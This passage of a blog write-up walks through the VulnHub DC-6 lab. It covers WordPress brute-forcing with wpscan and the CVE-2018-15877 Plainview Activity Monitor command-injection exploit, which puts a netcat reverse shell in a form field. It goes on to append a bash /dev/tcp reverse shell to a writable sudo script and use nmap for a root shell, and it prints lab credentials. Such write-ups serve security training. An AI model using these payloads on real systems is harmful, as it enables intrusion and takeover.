 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> The version is out of date, the latest version is 4.59
 |
 | Found By: Known Locations <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
 |  - http://wordy/wp-content/plugins/user-role-editor/, status: <span style=color:#ae81ff>200</span>
 |
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> <span style=color:#ae81ff>1</span> vulnerability identified:
 |
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Title: User Role Editor &lt;<span style=color:#f92672>=</span> 4.24 - Privilege Escalation
 |     Fixed in: 4.25
 |     References:
 |      - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c
 |      - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/
 |
 | Version: 4.24 <span style=color:#f92672>(</span>80% confidence<span style=color:#f92672>)</span>
 | Found By: Readme - Stable Tag <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
 |  - http://wordy/wp-content/plugins/user-role-editor/readme.txt
...
</code></pre></div><p>I&rsquo;m interested with the RCE one, but before that I&rsquo;ll have to find creds.</p><h4 id=brute-forcing-passwords>Brute-forcing passwords<a hidden class=anchor aria-hidden=true href=#brute-forcing-passwords>#</a></h4><p>At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn&rsquo;t know that the box&rsquo;s author actually gave us a hint to create a custom wordlist from <code>rokyou.txt</code>.</p><p><div class=img-container><img src=imgs/image-20210419183629054.png alt=image-20210419183629054></div></p><p>I&rsquo;ll create new wordlist from <code>rockyou.txt</code> and then use it to perform a brute force using <code>wpscan</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «dc-6» «192.168.43.234» 
$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt
→ root@iamf «dc-6» «192.168.43.234» 
$ wpscan --url http://wordy/ --usernames users --passwords passwords.txt 
</code></pre></div><p>It returns one valid credentials: <code>mark:helpdesk10</code>.</p><p><div class=img-container><img src=imgs/image-20210419184715108.png alt=image-20210419184715108></div></p><h2 id=foothold>Foothold<a hidden class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-www-data>Shell as www-data<a hidden class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=wp-dashboard>WP Dashboard<a hidden class=anchor aria-hidden=true href=#wp-dashboard>#</a></h4><p>With the credentials I obtained, I can login into the admin panel.</p><p><div class=img-container><img src=imgs/image-20210531002724008.png alt=image-20210531002724008></div></p><h4 id=plainview-activity-monitor---rce--cve-2018-15877>Plainview Activity Monitor - RCE (CVE-2018-15877)<a hidden class=anchor aria-hidden=true href=#plainview-activity-monitor---rce--cve-2018-15877>#</a></h4><p>From the previous <code>wpscan</code>, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from <a href=https://www.exploit-db.com/exploits/45274>exploit-db</a>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>html</span>&gt;
  <span style=color:#75715e>&lt;!--  Wordpress Plainview Activity Monitor RCE
</span><span style=color:#75715e>        [+] Version: 20161228 and possibly prior
</span><span style=color:#75715e>        [+] Description: Combine OS Commanding and CSRF to get reverse shell
</span><span style=color:#75715e>        [+] Author: LydA(c)ric LEFEBVRE
</span><span style=color:#75715e>        [+] CVE-ID: CVE-2018-15877
</span><span style=color:#75715e>        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell
</span><span style=color:#75715e>        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
</span><span style=color:#75715e>  --&gt;</span>
  &lt;<span style=color:#f92672>body</span>&gt;
  &lt;<span style=color:#f92672>script</span>&gt;<span style=color:#a6e22e>history</span>.<span style=color:#a6e22e>pushState</span>(<span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#e6db74>&#39;/&#39;</span>)&lt;/<span style=color:#f92672>script</span>&gt;
    &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;POST&#34;</span> <span style=color:#a6e22e>enctype</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;multipart/form-data&#34;</span>&gt;
      &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hidden&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ip&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&#34;</span> /&gt;
      &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;hidden&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;lookup&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Lookup&#34;</span> /&gt;
      &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Submit request&#34;</span> /&gt;
    &lt;/<span style=color:#f92672>form</span>&gt;
  &lt;/<span style=color:#f92672>body</span>&gt;
&lt;/<span style=color:#f92672>html</span>&gt;
</code></pre></div><p>The vulnerability comes from this IP tools feature.</p><p><div class=img-container><img src=imgs/image-20210419194814055.png alt=image-20210419194814055></div></p><p>I&rsquo;ll hit the lookup button and intercept the request on Burp.</p><p>RCE can be achieved by adding a set of malicious OS commands after the command pipe <code>|</code>, semi colon <code>;</code> (stacked command), or logical OR <code>||</code> at the <code>ip</code> section. In this case, I send a reverse shell.</p><p>Here is with command pipe.</p><p><div class=img-container><img src=imgs/image-20210419194314291.png alt=image-20210419194314291></div></p><p>And this one by stacking commands with semicolon.</p><p><div class=img-container><img src=imgs/image-20210419200042885.png alt=image-20210419200042885></div></p><p>I can not find the plugin&rsquo;s source code, my best guess it can be something like this.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>...</span>
$ip <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;ip&#39;</span>]
$do_something <span style=color:#f92672>=</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;dig </span><span style=color:#e6db74>$ip</span><span style=color:#e6db74>&#34;</span>)
<span style=color:#f92672>...</span>
</code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-graham>Shell as graham<a hidden class=anchor aria-hidden=true href=#shell-as-graham>#</a></h3><h4 id=internal-enumeration>Internal enumeration<a hidden class=anchor aria-hidden=true href=#internal-enumeration>#</a></h4><p>The home directory is readable by <code>www-data</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@dc-6:/var/www/html/wp-admin$ find /home 2&gt;/dev/null
find /home 2&gt;/dev/null
...
/home/jens/backups.sh
....
/home/mark/stuff/things-to-do.txt
....
</code></pre></div><p>I immediately checked the contents of <code>backups.sh</code> and <code>things-to-do.txt</code>.</p><p>The <code>backups.sh</code> script is writable by group <code>devs</code>, and I&rsquo;ll note that.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh
ls -l /home/jens/backups.sh
-rwxrwxr-x <span style=color:#ae81ff>1</span> jens devs <span style=color:#ae81ff>50</span> Apr <span style=color:#ae81ff>26</span>  <span style=color:#ae81ff>2019</span> /home/jens/backups.sh
www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
cat /home/jens/backups.sh
<span style=color:#75715e>#!/bin/bash</span>
tar -czf backups.tar.gz /var/www/html
</code></pre></div><p>And this <code>things-to-do.txt</code> contains graham&rsquo;s credentials.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
cat /home/mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah&#39;s farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah&#39;s replacement
</code></pre></div><h4 id=ssh---graham>SSH - graham<a hidden class=anchor aria-hidden=true href=#ssh---graham>#</a></h4><p>I tried the graham&rsquo;s creds, <code>graham:GSo7isUM1D4</code>, on SSH, and it worked.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>→ root@iamf «dc-6» «192.168.43.234» 
$ ssh graham@192.168.2.104
graham@192.168.2.104&#39;s password: 
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
graham@dc-6:~$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
</code></pre></div><h3 id=shell-as-jens>Shell as jens<a hidden class=anchor aria-hidden=true href=#shell-as-jens>#</a></h3><h4 id=sudo-privileges---backupssh>Sudo privileges - backups.sh<a hidden class=anchor aria-hidden=true href=#sudo-privileges---backupssh>#</a></h4><p>User <code>graham</code> has sudo privileges on the <code>backups.sh</code> script, and this allows me to run the script as user <code>jens</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
graham@dc-6:~$ cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
graham@dc-6:~$ ls -l /home/jens/backups.sh
-rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh
</code></pre></div><p>Because the script is also writable by graham (<code>devs</code> group), I can exploit this to escalate myself to <code>jens</code> by adding a reverse shell line to the script and then run it with sudo.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>graham@dc-6:~$ echo <span style=color:#e6db74>&#39;bash -i &gt;&amp; /dev/tcp/192.168.2.108/9000 0&gt;&amp;1&#39;</span> &gt;&gt; /home/jens/backups.sh
</code></pre></div><p><div class=img-container><img src=imgs/image-20210419204321872.png alt=image-20210419204321872></div></p><h3 id=shell-as--root>Shell as root<a hidden class=anchor aria-hidden=true href=#shell-as--root>#</a></h3><h4 id=sudo-privileges---nmap>Sudo privileges - nmap<a hidden class=anchor aria-hidden=true href=#sudo-privileges---nmap>#</a></h4><p>I found out that user <code>jens</code> is allowed to execute <code>nmap</code> as root user.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>jens@dc-6:/home/graham$ sudo -l
sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> jens on dc-6:
    env_reset, mail_badpass,
    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin

User jens may run the following commands on dc-6:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/nmap
</code></pre></div><p>I&rsquo;ll also exploit this using reference from <a href=https://gtfobins.github.io/gtfobins/nmap/>GTFObins</a>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>jens@dc-6:/home/graham$ TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp<span style=color:#66d9ef>)</span>
jens@dc-6:/home/graham$ echo <span style=color:#e6db74>&#39;os.execute(&#34;/bin/sh&#34;)&#39;</span> &gt; $TF
jens@dc-6:/home/graham$ sudo nmap --script<span style=color:#f92672>=</span>$TF
</code></pre></div><p><div class=img-container><img src=imgs/image-20210419204616406.png alt=image-20210419204616406></div></p><p>And here is the flag.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>root@dc-6:~# cat theflag.txt 


Yb        dP 888888 88     88         8888b.   dP&#34;Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88&#34;&#34;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&#34;&#34;   `&#34;&#39; 
   YP  YP    888888 88ood8 88ood8     8888Y&#34;   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre></div><hr><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ul><li><a href=https://www.vulnhub.com/entry/dc-6,315/>https://www.vulnhub.com/entry/dc-6,315/</a></li><li><a href=https://gtfobins.github.io/gtfobins/nmap/>https://gtfobins.github.io/gtfobins/nmap/</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/oscp-like/>OSCP-like</a></li><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/wordpress/>WordPress</a></li><li><a href=https://fahmifj.github.io/tags/cve-2018-15877/>CVE-2018-15877</a></li><li><a href=https://fahmifj.github.io/tags/sudo/>sudo</a></li><li><a href=https://fahmifj.github.io/tags/gtfobins/>GTFOBins</a></li><li><a href=https://fahmifj.github.io/tags/nse/>NSE</a></li><li><a href=https://fahmifj.github.io/tags/wpscan/>WPscan</a></li></ul><nav class=paginav><a class=prev href=https://fahmifj.github.io/blog/setup-vulnhub-machines/><span class=title>« Prev Page</span><br><span>Setup VulnHub Machines</span></a>
<a class=next href=https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/><span class=title>Next Page »</span><br><span>Linux Backdoors and Where to Find Them</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-6 on twitter" href="https://twitter.com/intent/tweet/?text=VulnHub%20-%20DC-6&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fvulnhub%2fvh-dc6%2f&hashtags=OSCP-like%2cLinux%2cWordPress%2cCVE-2018-15877%2csudo%2cGTFOBins%2cNSE%2cwpscan"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-6 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fvulnhub%2fvh-dc6%2f&title=VulnHub%20-%20DC-6&summary=VulnHub%20-%20DC-6&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fvulnhub%2fvh-dc6%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-6 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fvulnhub%2fvh-dc6%2f&title=VulnHub%20-%20DC-6"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-6 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fvulnhub%2fvh-dc6%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-6 on whatsapp" href="https://api.whatsapp.com/send?text=VulnHub%20-%20DC-6%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fvulnhub%2fvh-dc6%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - DC-6 on telegram" href="https://telegram.me/share/url?text=VulnHub%20-%20DC-6&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fvulnhub%2fvh-dc6%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script></body></html>